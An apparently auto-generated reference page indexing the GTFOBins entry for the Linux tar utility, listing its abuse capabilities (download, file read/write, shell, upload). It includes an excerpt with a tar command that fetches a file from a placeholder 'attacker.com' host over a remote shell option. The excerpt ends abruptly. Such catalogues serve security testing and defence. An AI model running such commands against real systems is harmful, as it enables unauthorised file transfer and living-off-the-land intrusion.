---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tar

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tar` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for tar covering download, file-read, file-write, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/tar.md)
- Source verification: [source record](../../sources/gtfobins/tar.md)

## Aliases

- `tar`

## Source Verification

[source record](../../sources/gtfobins/tar.md)

## Evidence Excerpt

```text
_body: ''
_name: tar
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar
functions:
download:
- code: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
comment: The attacker box must have the `rmt` utility installed.
contexts:
```
